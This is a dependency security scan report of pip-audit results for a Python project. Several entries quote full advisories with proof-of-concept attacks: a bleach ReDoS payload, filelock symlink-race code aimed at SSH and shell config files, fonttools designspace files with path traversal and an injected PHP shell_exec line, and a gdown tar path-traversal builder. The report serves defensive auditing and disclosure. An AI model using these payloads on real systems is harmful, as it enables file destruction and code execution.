---
title: "Security Scan Report"
category: research
tags: [research]
created: 2026-07-18
updated: 2026-07-18
status: active
---

# Security Scan Report

**Generated:** 2026-07-12 16:13:00  
**Tool:** security-scan.sh  
**Version:** 1.0

---

## Executive Summary

### Python Security

#### Safety Check

```
No vulnerabilities found or safety check failed
```

#### pip-audit Check

```
[null] accelerate 1.6.0
  null: null
  Fix: No fix available
[null] aenum 3.1.16
  null: null
  Fix: No fix available
[null] aiocache 0.12.3
  null: null
  Fix: No fix available
[null] aiofiles 24.1.0
  null: null
  Fix: No fix available
[null] aiohappyeyeballs 2.6.1
  null: null
  Fix: No fix available
[null] aiohttp 3.11.11
  PYSEC-2026-1100: ### Summary A request can be crafted in such a way that an aiohttp server's memory fills up uncontrollably during processing.  ### Impact If an application includes a handler that uses the `Request.post()` method, an attacker may be able to freeze the server by exhausting the memory.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60
  Fix: 3.13.3
[null] aiosignal 1.3.2
  null: null
  Fix: No fix available
[null] aiosqlite 0.22.1
  null: null
  Fix: No fix available
[null] alembic 1.14.0
  null: null
  Fix: No fix available
[null] altair 4.2.2
  null: null
  Fix: No fix available
[null] annotated-doc 0.0.4
  null: null
  Fix: No fix available
[null] annotated-types 0.7.0
  null: null
  Fix: No fix available
[null] anthropic 0.49.0
  null: null
  Fix: No fix available
[null] anyio 4.9.0
  null: null
  Fix: No fix available
[null] anywidget 0.10.0
  null: null
  Fix: No fix available
[null] appdirs 1.4.4
  null: null
  Fix: No fix available
[null] appnope 0.1.4
  null: null
  Fix: No fix available
[null] apscheduler 3.10.4
  null: null
  Fix: No fix available
[null] argon2-cffi 23.1.0
  null: null
  Fix: No fix available
[null] argon2-cffi-bindings 21.2.0
  null: null
  Fix: No fix available
[null] arrow 1.4.0
  null: null
  Fix: No fix available
[null] asgiref 3.8.1
  null: null
  Fix: No fix available
[null] astrapy 2.0.1
  null: null
  Fix: No fix available
[null] astroid 3.0.3
  null: null
  Fix: No fix available
[null] asttokens 3.0.1
  null: null
  Fix: No fix available
[null] async-lru 2.3.0
  null: null
  Fix: No fix available
[null] async-timeout 4.0.3
  null: null
  Fix: No fix available
[null] attrs 25.3.0
  null: null
  Fix: No fix available
[null] authlib 1.4.1
  PYSEC-2026-25: ### Summary  There is no CSRF protection on the cache feature on most integrations clients.  ### Details In `authlib.integrations.starlette_client.OAuth`, no CSRF protection is set up when using the cache parameter. When _not_ using the cache parameter, the use of SessionMiddleware ties the client to the auth state, preventing CSRF attacks. With the cache, there is no such mechanism. Other integratons have the same issue, it's not just starlette.  The state parameter is taken from the callback URL and the state is fetched from the cache without checking that it is the same client calling the redirect endpoint as was the one that initiated the auth flow.  This issue is documented in RFC 6749 section 10.12: https://datatracker.ietf.org/doc/html/rfc6749#section-10.12  ### PoC - Set up a Starlette integration with a cache - The attacker starts the auth flow up until before the callback URL is followed. - The attacked sends the redirect URL to the victim - The victim now completes the authorisation  ### Impact This impacts all users that use the cache to store auth state.  All users will be vulnerable to CSRF attacks and may have an attacker's account tied to their own.
  Fix: 1.6.11
[null] autoflake 2.3.3
  null: null
  Fix: No fix available
[null] autopep8 2.3.2
  null: null
  Fix: No fix available
[null] av 14.3.0
  null: null
  Fix: No fix available
[null] azure-ai-documentintelligence 1.0.0
  null: null
  Fix: No fix available
[null] azure-core 1.33.0
  PYSEC-2026-1208: Deserialization of untrusted data in Azure Core shared client library for Python allows an authorized attacker to execute code over a network.
  Fix: 1.38.0
[null] azure-identity 1.20.0
  null: null
  Fix: No fix available
[null] azure-storage-blob 12.24.1
  null: null
  Fix: No fix available
[null] babel 2.18.0
  null: null
  Fix: No fix available
[null] backoff 2.2.1
  null: null
  Fix: No fix available
[null] bandit 1.9.3
  null: null
  Fix: No fix available
[null] bcrypt 4.3.0
  null: null
  Fix: No fix available
[null] beautifulsoup4 4.13.3
  null: null
  Fix: No fix available
[null] bidict 0.23.1
  null: null
  Fix: No fix available
[null] bitarray 3.3.1
  null: null
  Fix: No fix available
[null] black 26.3.1
  null: null
  Fix: No fix available
[null] bleach 6.3.0
  GHSA-g75f-g53v-794x: ## Summary Bleach 6.3.0 exposes a documented email-linkification path through `bleach.linkify(..., parse_email=True)`. The implementation scans attacker-controlled text with `EMAIL_RE.finditer()` over the full character token and has no length, timeout, or linear prefilter before applying the dot-atom email regex. A non-email payload around 30 KB causes multi-second CPU consumption per request/call, creating a direct availability risk for applications that enable email linkification on user-submitted text.  ## Affected Product - Package: `bleach` - Ecosystem: pip - Affected versions: verified in `6.3.0`; exact first affected version not established - Patched versions: none known at finalization time - Tested version: `6.3.0` - Audit commit/tag: `v6.3.0` / `5546d5dbce60d08ccb99d981778d74044d646d4e` - PyPI sdist SHA256: `6f3b91b1c0a02bb9a78b5a454c92506aa0fdf197e1d5e114d2e00c6f64306d22`  ## Vulnerability Details - CWE: CWE-1333: Inefficient Regular Expression Complexity; related availability impact maps to CWE-400 - Component: `bleach/linkifier.py`, `build_email_re()`, `LinkifyFilter.handle_email_addresses()` - Root cause: `handle_email_addresses()` calls `self.email_re.finditer(text)` on attacker-controlled text. `EMAIL_RE` includes a repeated dot-atom local-part pattern, so non-email strings such as repeated `a.` segments with no `@` force repeated long failing scans. - Security boundary violated: user-submitted text processed by a documented safe linkification helper should not allow an attacker to impose superlinear CPU cost through non-email text. - Direct impact: per-request CPU exhaustion / denial-of-service risk in applications that enable `parse_email=True` on attacker-controlled text. - Chain impact, if any: one proof run observed an unrelated `/health` request delayed during a concurrent attack request, but this was not reliable across reviewer retests. Treat cross-request service degradation as environment-dependent supporting evidence, not the primary impact. - Severity estimate: Medium / availability-only. The feature is opt-in and deployment body limits/timeouts affect practical severity.  Relevant code path: - `bleach/__init__.py:85-125`: public `linkify(text, ..., parse_email=False)` constructs `Linker(..., parse_email=parse_email)` and calls `linker.linkify(text)`. - `bleach/linkifier.py:77-88`: `EMAIL_RE` is compiled from the dot-atom email pattern. - `bleach/linkifier.py:292-301`: `handle_email_addresses()` applies `self.email_re.finditer(text)` to each character token. - `bleach/linkifier.py:620-623`: character tokens are routed into email handling only when `parse_email` is true. - `docs/goals.rst:30-40`: Bleach documents user comments, profile bios, and descriptions as target untrusted text use cases. - `docs/linkify.rst:300-305`: `parse_email=True` is the documented option for creating `mailto:` links.  ## Attack Preconditions - The consuming application enables the documented `parse_email=True` option, for example `bleach.linkify(user_text, parse_email=True)` or `Linker(parse_email=True).linkify(user_text)`. - The attacker can submit text that reaches that linkification path. Authentication depends on the host application; a public comment form would make this unauthenticated, while account-only text fields require user privileges. - The application allows roughly 20-30 KB of text to reach Bleach and lacks a strict timeout or input cap before linkification. - No custom bounded `email_re` is supplied.  ## Reproduction Minimal API trigger:  ```python import bleach payload = ("a." * 15000) + "a" bleach.linkify(payload, parse_email=True) ```  The saved HTTP proof uses a local harness with `POST /preview` calling `bleach.linkify(request_body, parse_email=True)` and a control endpoint using `parse_email=False` on the same payload. The exploit sends baseline/control/attack requests over HTTP to `127.0.0.1`.  ## Proof Evidence The proof ran against Bleach `6.3.0` installed from the audited local checkout in an isolated temporary venv. It used Python `3.12.3` on Linux.  Measured HTTP proof results: - Payload: `("a." * 15000) + "a"` (`30001` bytes) - Normal baseline `/preview` mean: `0.001425` seconds - Same 30 KB payload with `parse_email=False`: `0.048349` seconds - Attack payload with `parse_email=True`: `8.719818` seconds - Slowdown versus the larger baseline/control mean: `180.35x` - Requests sent by proof: `20`  Evidence files: [poc.py](https://github.com/user-attachments/files/27129729/poc.py) [poc_results.json](https://github.com/user-attachments/files/27129737/poc_results.json) [exploit_proof.py](https://github.com/user-attachments/files/27129751/exploit_proof.py) [exploit_results.json](https://github.com/user-attachments/files/27129752/exploit_results.json)  ## Scope and Limitations - This report does not claim XSS, authentication bypass, data disclosure, remote code execution, persistent crash, or persistent service outage. - `parse_email=True` is not the default. The affected path is a documented opt-in feature. - The exact first affected version is not established. - Practical impact depends on host application input limits, worker model, request timeout policy, and whether untrusted users can submit text to an email-linkification path. - A reviewer reproduced the direct CPU cost but did not reproduce the proof harness’s `/health` delay. The direct impact claim is therefore limited to per-request CPU exhaustion. - Bleach is marked deprecated in `README.rst`, and `SECURITY.md` has stale supported-version text, but the package still has a 2025 PyPI release and published Mozilla security reporting routes.
  Fix: No fix available
[null] blinker 1.9.0
  null: null
  Fix: No fix available
[null] boolean-py 5.0
  null: null
  Fix: No fix available
[null] boto3 1.35.53
  null: null
  Fix: No fix available
[null] botocore 1.37.33
  null: null
  Fix: No fix available
[null] build 1.2.2.post1
  null: null
  Fix: No fix available
[null] cachecontrol 0.14.4
  null: null
  Fix: No fix available
[null] cachetools 5.5.2
  null: null
  Fix: No fix available
[null] certifi 2025.1.31
  null: null
  Fix: No fix available
[null] cffi 2.0.0
  null: null
  Fix: No fix available
[null] chardet 5.2.0
  null: null
  Fix: No fix available
[null] charset-normalizer 3.4.1
  null: null
  Fix: No fix available
[null] chroma-hnswlib 0.7.6
  null: null
  Fix: No fix available
[null] chromadb 0.6.2
  null: null
  Fix: No fix available
[null] click 8.1.8
  null: null
  Fix: No fix available
[null] cloudpickle 3.1.2
  null: null
  Fix: No fix available
[null] colbert-ai 0.2.21
  null: null
  Fix: No fix available
[null] colorclass 2.2.2
  null: null
  Fix: No fix available
[null] coloredlogs 15.0.1
  null: null
  Fix: No fix available
[null] colorlog 6.10.1
  null: null
  Fix: No fix available
[null] comm 0.2.3
  null: null
  Fix: No fix available
[null] compressed-rtf 1.0.7
  null: null
  Fix: No fix available
[null] contourpy 1.3.3
  null: null
  Fix: No fix available
[null] coreforecast 0.0.17
  null: null
  Fix: No fix available
[null] coverage 7.13.5
  null: null
  Fix: No fix available
[null] cryptography 44.0.2
  PYSEC-2026-35: ## Summary  In versions of cryptography prior to 46.0.5, DNS name constraints were only validated against SANs within child certificates, and not the "peer name" presented during each validation. Consequently, cryptography would allow a peer named `bar.example.com` to validate against a wildcard leaf certificate for `*.example.com`, even if the leaf's parent certificate (or upwards) contained an excluded subtree constraint for `bar.example.com`.  This behavior resulted from a gap between RFC 5280 (which defines Name Constraint semantics) and RFC 9525 (which defines service identity semantics): put together, neither states definitively whether Name Constraints should be applied to peer names. To close this gap, cryptography now conservatively rejects any validation where the peer name would be rejected by a name constraint if it were a SAN instead.  In practice, exploitation of this bypass requires an uncommon X.509 topology, one that the Web PKI avoids because it exhibits these kinds of problems. Consequently, we consider this a medium-to-low impact severity.  See CVE-2025-61727 for a similar bypass in Go's `crypto/x509`.  ## Remediation  Users should upgrade to 46.0.6 or newer.   ## Attribution  Reporter: @1seal
  Fix: 46.0.6
[null] ctranslate2 4.6.0
  null: null
  Fix: No fix available
[null] curl-cffi 0.15.0
  null: null
  Fix: No fix available
[null] cycler 0.12.1
  null: null
  Fix: No fix available
[null] cyclonedx-python-lib 11.6.0
  null: null
  Fix: No fix available
[null] dataclasses-json 0.6.7
  null: null
  Fix: No fix available
[null] datasets 3.5.0
  null: null
  Fix: No fix available
[null] dateparser 1.4.0
  null: null
  Fix: No fix available
[null] debugpy 1.8.14
  null: null
  Fix: No fix available
[null] decorator 5.2.1
  null: null
  Fix: No fix available
[null] defusedxml 0.7.1
  null: null
  Fix: No fix available
[null] deprecated 1.2.18
  null: null
  Fix: No fix available
[null] deprecation 2.1.0
  null: null
  Fix: No fix available
[null] dill 0.3.8
  null: null
  Fix: No fix available
[null] distro 1.9.0
  null: null
  Fix: No fix available
[null] dnspython 2.7.0
  null: null
  Fix: No fix available
[null] docker 7.1.0
  null: null
  Fix: No fix available
[null] docx2txt 0.8
  null: null
  Fix: No fix available
[null] dparse 0.6.4
  null: null
  Fix: No fix available
[null] duckdb 1.5.4
  null: null
  Fix: No fix available
[null] duckduckgo-search 7.3.2
  null: null
  Fix: No fix available
[null] durationpy 0.9
  null: null
  Fix: No fix available
[null] easygui 0.98.3
  null: null
  Fix: No fix available
[null] ebcdic 1.1.1
  null: null
  Fix: No fix available
[null] ecdsa 0.19.1
  PYSEC-2026-1325: python-ecdsa has been found to be subject to a Minerva timing attack on the P-256 curve. Using the `ecdsa.SigningKey.sign_digest()` API function and timing signatures an attacker can leak the internal nonce which may allow for private key discovery. Both ECDSA signatures, key generation, and ECDH operations are affected. ECDSA signature verification is unaffected. The python-ecdsa project considers side channel attacks out of scope for the project and there is no planned fix.
  Fix: No fix available
[null] einops 0.8.1
  null: null
  Fix: No fix available
[null] elastic-transport 8.17.1
  null: null
  Fix: No fix available
[null] elasticsearch 8.17.1
  null: null
  Fix: No fix available
[null] emoji 2.14.1
  null: null
  Fix: No fix available
[null] entrypoints 0.4
  null: null
  Fix: No fix available
[null] et-xmlfile 2.0.0
  null: null
  Fix: No fix available
[null] eval-type-backport 0.2.2
  null: null
  Fix: No fix available
[null] events 0.5
  null: null
  Fix: No fix available
[null] execnet 2.1.2
  null: null
  Fix: No fix available
[null] executing 2.2.1
  null: null
  Fix: No fix available
[null] extract-msg 0.54.1
  null: null
  Fix: No fix available
[null] factory-boy 3.3.0
  null: null
  Fix: No fix available
[null] fake-useragent 2.1.0
  null: null
  Fix: No fix available
[null] faker 20.1.0
  null: null
  Fix: No fix available
[null] fastapi 0.115.7
  null: null
  Fix: No fix available
[null] faster-whisper 1.1.1
  null: null
  Fix: No fix available
[null] fastjsonschema 2.21.2
  null: null
  Fix: No fix available
[null] filelock 3.18.0
  PYSEC-2026-1375: ### Impact  A Time-of-Check-Time-of-Use (TOCTOU) race condition allows local attackers to corrupt or truncate arbitrary user files through symlink attacks. The vulnerability exists in both Unix and Windows lock file creation where filelock checks if a file exists before opening it with O_TRUNC. An attacker can create a symlink pointing to a victim file in the time gap between the check and open, causing os.open() to follow the symlink and truncate the target file.  **Who is impacted:**  All users of filelock on Unix, Linux, macOS, and Windows systems. The vulnerability cascades to dependent libraries:  - **virtualenv users**: Configuration files can be overwritten with virtualenv metadata, leaking sensitive paths - **PyTorch users**: CPU ISA cache or model checkpoints can be corrupted, causing crashes or ML pipeline failures - **poetry/tox users**: through using virtualenv or filelock on their own.  Attack requires local filesystem access and ability to create symlinks (standard user permissions on Unix; Developer Mode on Windows 10+). Exploitation succeeds within 1-3 attempts when lock file paths are predictable.  ### Patches  Fixed in version **3.20.1**.  **Unix/Linux/macOS fix:** Added O_NOFOLLOW flag to os.open() in UnixFileLock.\_acquire() to prevent symlink following.  **Windows fix:** Added GetFileAttributesW API check to detect reparse points (symlinks/junctions) before opening files in WindowsFileLock.\_acquire().  **Users should upgrade to filelock 3.20.1 or later immediately.**  ### Workarounds  If immediate upgrade is not possible:  1. Use SoftFileLock instead of UnixFileLock/WindowsFileLock (note: different locking semantics, may not be suitable for all use cases) 2. Ensure lock file directories have restrictive permissions (chmod 0700) to prevent untrusted users from creating symlinks 3. Monitor lock file directories for suspicious symlinks before running trusted applications  **Warning:** These workarounds provide only partial mitigation. The race condition remains exploitable. Upgrading to version 3.20.1 is strongly recommended.  ______________________________________________________________________  ## Technical Details: How the Exploit Works  ### The Vulnerable Code Pattern  **Unix/Linux/macOS** (`src/filelock/_unix.py:39-44`):  ```python def _acquire(self) -> None:     ensure_directory_exists(self.lock_file)     open_flags = os.O_RDWR | os.O_TRUNC  # (1) Prepare to truncate     if not Path(self.lock_file).exists():  # (2) CHECK: Does file exist?         open_flags |= os.O_CREAT     fd = os.open(self.lock_file, open_flags, ...)  # (3) USE: Open and truncate ```  **Windows** (`src/filelock/_windows.py:19-28`):  ```python def _acquire(self) -> None:     raise_on_not_writable_file(self.lock_file)  # (1) Check writability     ensure_directory_exists(self.lock_file)     flags = os.O_RDWR | os.O_CREAT | os.O_TRUNC  # (2) Prepare to truncate     fd = os.open(self.lock_file, flags, ...)  # (3) Open and truncate ```  ### The Race Window  The vulnerability exists in the gap between operations:  **Unix variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file exists? → False T1                                             ↓ RACE WINDOW T2                                             Create symlink: lock → victim_file T3      Open lock_file with O_TRUNC         → Follows symlink         → Opens victim_file         → Truncates victim_file to 0 bytes! ☠️ ```  **Windows variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file writable? T1                                             ↓ RACE WINDOW T2                                             Create symlink: lock → victim_file T3      Open lock_file with O_TRUNC         → Follows symlink/junction         → Opens victim_file         → Truncates victim_file to 0 bytes! ☠️ ```  ### Step-by-Step Attack Flow  **1. Attacker Setup:**  ```python # Attacker identifies target application using filelock lock_path = "/tmp/myapp.lock"  # Predictable lock path victim_file = "/home/victim/.ssh/config"  # High-value target ```  **2. Attacker Creates Race Condition:**  ```python import os import threading   def attacker_thread():     # Remove any existing lock file     try:         os.unlink(lock_path)     except FileNotFoundError:         pass      # Create symlink pointing to victim file     os.symlink(victim_file, lock_path)     print(f"[Attacker] Created: {lock_path} → {victim_file}")   # Launch attack threading.Thread(target=attacker_thread).start() ```  **3. Victim Application Runs:**  ```python from filelock import UnixFileLock  # Normal application code lock = UnixFileLock("/tmp/myapp.lock") lock.acquire()  # ← VULNERABILITY TRIGGERED HERE # At this point, /home/victim/.ssh/config is now 0 bytes! ```  **4. What Happens Inside os.open():**  On Unix systems, when `os.open()` is called:  ```c // Linux kernel behavior (simplified) int open(const char *pathname, int flags) {     struct file *f = path_lookup(pathname);  // Resolves symlinks by default!      if (flags & O_TRUNC) {         truncate_file(f);  // ← Truncates the TARGET of the symlink     }      return file_descriptor; } ```  Without `O_NOFOLLOW` flag, the kernel follows the symlink and truncates the target file.  ### Why the Attack Succeeds Reliably  **Timing Characteristics:**  - **Check operation** (Path.exists()): ~100-500 nanoseconds - **Symlink creation** (os.symlink()): ~1-10 microseconds - **Race window**: ~1-5 microseconds (very small but exploitable) - **Thread scheduling quantum**: ~1-10 milliseconds  **Success factors:**  1. **Tight loop**: Running attack in a loop hits the race window within 1-3 attempts 2. **CPU scheduling**: Modern OS thread schedulers frequently context-switch during I/O operations 3. **No synchronization**: No atomic file creation prevents the race 4. **Symlink speed**: Creating symlinks is extremely fast (metadata-only operation)  ### Real-World Attack Scenarios  **Scenario 1: virtualenv Exploitation**  ```python # Victim runs: python -m venv /tmp/myenv # Attacker racing to create: os.symlink("/home/victim/.bashrc", "/tmp/myenv/pyvenv.cfg")  # Result: /home/victim/.bashrc overwritten with: # home = /usr/bin/python3 # include-system-site-packages = false # version = 3.11.2 # ← Original .bashrc contents LOST + virtualenv metadata LEAKED to attacker ```  **Scenario 2: PyTorch Cache Poisoning**  ```python # Victim runs: import torch # PyTorch checks CPU capabilities, uses filelock on cache # Attacker racing to create: os.symlink("/home/victim/.torch/compiled_model.pt", "/home/victim/.cache/torch/cpu_isa_check.lock")  # Result: Trained ML model checkpoint truncated to 0 bytes # Impact: Weeks of training lost, ML pipeline DoS ```  ### Why Standard Defenses Don't Help  **File permissions don't prevent this:**  - Attacker doesn't need write access to victim_file - os.open() with O_TRUNC follows symlinks using the *victim's* permissions - The victim process truncates its own file  **Directory permissions help but aren't always feasible:**  - Lock files often created in shared /tmp directory (mode 1777) - Applications may not control lock file location - Many apps use predictable paths in user-writable directories  **File locking doesn't prevent this:**  - The truncation happens *during* the open() call, before any lock is acquired - fcntl.flock() only prevents concurrent lock acquisition, not symlink attacks  ### Exploitation Proof-of-Concept Results  From empirical testing with the provided PoCs:  **Simple Direct Attack** (`filelock_simple_poc.py`):  - Success rate: 33% per attempt (1 in 3 tries) - Average attempts to success: 2.1 - Target file reduced to 0 bytes in \<100ms  **virtualenv Attack** (`weaponized_virtualenv.py`):  - Success rate: ~90% on first attempt (deterministic timing) - Information leaked: File paths, Python version, system configuration - Data corruption: Complete loss of original file contents  **PyTorch Attack** (`weaponized_pytorch.py`):  - Success rate: 25-40% per attempt - Impact: Application crashes, model loading failures - Recovery: Requires cache rebuild or model retraining  **Discovered and reported by:** George Tsigourakos (@tsigouris007)
  Fix: 3.20.1
[null] filetype 1.2.0
  null: null
  Fix: No fix available
[null] firecrawl-py 1.12.0
  null: null
  Fix: No fix available
[null] flake8 7.0.0
  null: null
  Fix: No fix available
[null] flask 3.1.0
  PYSEC-2026-1377: In Flask 3.1.0, the way fallback key configuration was handled resulted in the last fallback key being used for signing, rather than the current signing key.  Signing is provided by the `itsdangerous` library. A list of keys can be passed, and it expects the last (top) key in the list to be the most recent key, and uses that for signing. Flask was incorrectly constructing that list in reverse, passing the signing key first.  Sites that have opted-in to use key rotation by setting `SECRET_KEY_FALLBACKS` are likely to unexpectedly be signing their sessions with stale keys, and their transition to fresher keys will be impeded. Sessions are still signed, so this would not cause any sort of data integrity loss.
  Fix: 3.1.1
[null] flask-cors 5.0.1
  PYSEC-2026-1383: corydolphin/flask-cors version 5.0.1 contains a vulnerability where the request path matching is case-insensitive due to the use of the `try_match` function, which is originally intended for matching hosts. This results in a mismatch because paths in URLs are case-sensitive, but the regex matching treats them as case-insensitive. This misconfiguration can lead to significant security vulnerabilities, allowing unauthorized origins to access paths meant to be restricted, resulting in data exposure and potential data leaks.
  Fix: 6.0.0
[null] flatbuffers 25.2.10
  null: null
  Fix: No fix available
[null] fonttools 4.57.0
  CVE-2025-66034: ## Summary  The `fonttools varLib` (or `python3 -m fontTools.varLib`) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the `main()` code path of `fontTools.varLib`, used by the fonttools varLib CLI and any code that invokes `fontTools.varLib.main()`.  The vulnerability exists due to unsanitised filename handling combined with content injection. Attackers can write files to arbitrary filesystem locations via path traversal sequences, and inject malicious code (like PHP) into the output files through XML injection in labelname elements. When these files are placed in web-accessible locations and executed, this achieves remote code execution without requiring any elevated privileges. Once RCE is obtained, attackers can further escalate privileges to compromise system files (like overwriting `/etc/passwd`).  Overall this allows attackers to: - Write font files to arbitrary locations on the filesystem - Overwrite configuration files - Corrupt application files and dependencies - Obtain remote code execution  The attacker controls the file location, extension and contents which could lead to remote code execution as well as enabling a denial of service through file corruption means.  ## Affected Lines  `fontTools/varLib/__init__.py` ```python filename = vf.filename # Unsanitised filename output_path = os.path.join(output_dir, filename) # Path traversal vf.save(output_path) # Arbitrary file write ```  ## PoC 1. Set up `malicious.designspace` and respective `source-*.ttf` files in a directory like `/Users/<username>/testing/demo/` (will impact relative file location within malicious.designspace)  `setup.py` ```python #!/usr/bin/env python3 import os  from fontTools.fontBuilder import FontBuilder from fontTools.pens.ttGlyphPen import TTGlyphPen  def create_source_font(filename, weight=400):     fb = FontBuilder(unitsPerEm=1000, isTTF=True)     fb.setupGlyphOrder([".notdef"])     fb.setupCharacterMap({})          pen = TTGlyphPen(None)     pen.moveTo((0, 0))     pen.lineTo((500, 0))     pen.lineTo((500, 500))     pen.lineTo((0, 500))     pen.closePath()          fb.setupGlyf({".notdef": pen.glyph()})     fb.setupHorizontalMetrics({".notdef": (500, 0)})     fb.setupHorizontalHeader(ascent=800, descent=-200)     fb.setupOS2(usWeightClass=weight)     fb.setupPost()     fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})     fb.save(filename)  if __name__ == '__main__':     os.chdir(os.path.dirname(os.path.abspath(__file__)))     create_source_font("source-light.ttf", weight=100)     create_source_font("source-regular.ttf", weight=400) ```  `malicious.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format="5.0">   <axes>     <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>   </axes>      <sources>     <source filename="source-light.ttf" name="Light">       <location>         <dimension name="Weight" xvalue="100"/>       </location>     </source>     <source filename="source-regular.ttf" name="Regular">       <location>         <dimension name="Weight" xvalue="400"/>       </location>     </source>   </sources>      <!-- Filename can be arbitrarily set to any path on the filesystem -->   <variable-fonts>     <variable-font name="MaliciousFont" filename="../../tmp/newarbitraryfile.json">       <axis-subsets>         <axis-subset name="Weight"/>       </axis-subsets>     </variable-font>   </variable-fonts> </designspace> ```  Optional: You can put a file with any material within `../../tmp/newarbitraryfile.json` in advance, the contents in the file will be overwritten after running the setup script in the following step.  2. Run the setup.py script to generate `source-*.tff` files required for the malicious.designspace file. ```bash python3 setup.py ``` 3. Execute the given payload using the vulnerable varLib saving the file into the arbitrary file location of filename ```bash fonttools varLib malicious.designspace ``` 4. Validate arbitrary file write was performed by looking at path assigned within malicious designspace ```bash cat {{filename_location}} ``` 5. After validating that we can provide arbitrary write to any location, we can also validate that we can control sections of content as well demonstrated with the below payload.  `malicious2.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format="5.0"> 	<axes>         <!-- XML injection occurs in labelname elements with CDATA sections --> 	    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"> 	        <labelname xml:lang="en"><![CDATA[<?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?>]]]]><![CDATA[>]]></labelname> 	        <labelname xml:lang="fr">MEOW2</labelname> 	    </axis> 	</axes> 	<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/> 	<sources> 		<source filename="source-light.ttf" name="Light"> 			<location> 				<dimension name="Weight" xvalue="100"/> 			</location> 		</source> 		<source filename="source-regular.ttf" name="Regular"> 			<location> 				<dimension name="Weight" xvalue="400"/> 			</location> 		</source> 	</sources> 	<variable-fonts> 		<variable-font name="MyFont" filename="output.ttf"> 			<axis-subsets> 				<axis-subset name="Weight"/> 			</axis-subsets> 		</variable-font> 	</variable-fonts> 	<instances> 		<instance name="Display Thin" familyname="MyFont" stylename="Thin"> 			<location><dimension name="Weight" xvalue="100"/></location> 			<labelname xml:lang="en">Display Thin</labelname> 		</instance> 	</instances> </designspace> ```  6. When the program is run, we can show we control the contents in the new file ```bash fonttools varLib malicious2.designspace -o file123 ``` Here being outputted to a localised area ignoring filename presented in variable-font  7. We can look inside file123 to validate user controlled injection ```bash cat file123 ``` to show `<?php echo shell_exec("/usr/bin/touch /tmp/MEOW123");?>]]>`  8. Executing the file and reading looking at the newly generated file ```bash php file123 ls -la /tmp/MEOW123 ``` we can see that the file was just created showing RCE.  ## Recommendations  - Ensure output file paths configured within designspace files are restricted to the local directory or consider further security measures to prevent arbitrary file write/overwrite within any directory on the system
  Fix: 4.60.2
[null] fpdf2 2.8.2
  null: null
  Fix: No fix available
[null] fqdn 1.5.1
  null: null
  Fix: No fix available
[null] frozendict 2.4.7
  null: null
  Fix: No fix available
[null] frozenlist 1.5.0
  null: null
  Fix: No fix available
[null] fs 2.4.16
  null: null
  Fix: No fix available
[null] fsspec 2024.12.0
  null: null
  Fix: No fix available
[null] ftfy 6.2.3
  null: null
  Fix: No fix available
[null] gcp-storage-emulator 2024.8.3
  null: null
  Fix: No fix available
[null] gdelt 0.1.14
  null: null
  Fix: No fix available
[null] gdown 5.2.0
  CVE-2026-40491: ### Summary The gdown library (tested on v5.2.1) is vulnerable to a Path Traversal attack within its extractall functionality. When extracting a maliciously crafted ZIP or TAR archive, the library fails to sanitize or validate the filenames of the archive members. This allow files to be written outside the intended destination directory, potentially leading to arbitrary file overwrite and Remote Code Execution (RCE).  ### Details The vulnerability exists in `gdown/extractall.py` within the `extractall()` function. The function takes an archive path and a destination directory (`to`), then calls the underlying `extractall()` method of Python's `tarfile` or `zipfile` modules without validating whether the archive members stay within the `to` boundary.  Vulnerable Code: ``` # gdown/extractall.py def extractall(path, to=None):     # ... (omitted) ...     with opener(path, mode) as f:         f.extractall(path=to)  # Vulnerable: No path validation or filters` ``` Even on modern Python versions (3.12+), if the `filter` parameter is not explicitly set or if the library's wrapper logic bypasses modern protections, path traversal remains possible as demonstrated in the PoC.   ### PoC ## Steps to Reproduce  1. Create the Malicious Archive (`poc.py`): ``` import tarfile import io import os  # Create a target directory os.makedirs("./safe_target/subfolder", exist_ok=True)  # Generate a TAR file containing a member with path traversal with tarfile.open("evil.tar", "w") as tar:     # Target: escape the subfolder and write to the parent 'safe_target'     payload = tarfile.TarInfo(name="../escape.txt")     content = b"Path Traversal Success!"     payload.size = len(content)     tar.addfile(payload, io.BytesIO(content))  print("[+] evil.tar created.")` ``` 1. Execute the Vulnerable Function: ``` `python3 -c "from gdown import extractall; extractall('evil.tar', to='./safe_target/subfolder')"` ``` 1. Verify the Escape: ``` ls -l ./safe_target/escape.txt # Output: -rw-r--r-- 1 user user 23 Mar 15 2026 ./safe_target/escape.txt` ```  ### Impact An attacker can provide a specially crafted archive that, when extracted via `gdown`, overwrites critical files on the victim's system.  - Arbitrary File Overwrite: Overwriting `.bashrc`, `.ssh/authorized_keys`, or configuration files. - Remote Code Execution (RCE): By overwriting executable scripts or Python modules within a virtual environment.   ### Recommended Mitigation  mplement path validation to ensure that all extracted files are contained within the target directory.  **Suggested Fix:**  ``` import os  def is_within_directory(directory, target):     abs_directory = os.path.abspath(directory)     abs_target = os.path.abspath(target)     prefix = os.path.commonpath([abs_directory])     return os.path.commonpath([abs_directory, abs_target]) == prefix  # Inside [extractall.py](http://extractall.py/) with opener(path, mode) as f:     if isinstance(f, tarfile.TarFile):         for member in f.getmembers():             member_path = os.path.join(to, [member.name](http://member.name/))             if not is_within_directory(to, member_path):                 raise Exception("Attempted Path Traversal in Tar File")     f.extractall(path=to) ```
  Fix: 5.2.2
[null] git-python 1.0.3
  null: null
  Fix: No fix available
[null] gitdb 4.0.12
  null: null
  Fix: No fix available
[null] gitpython 3.1.44
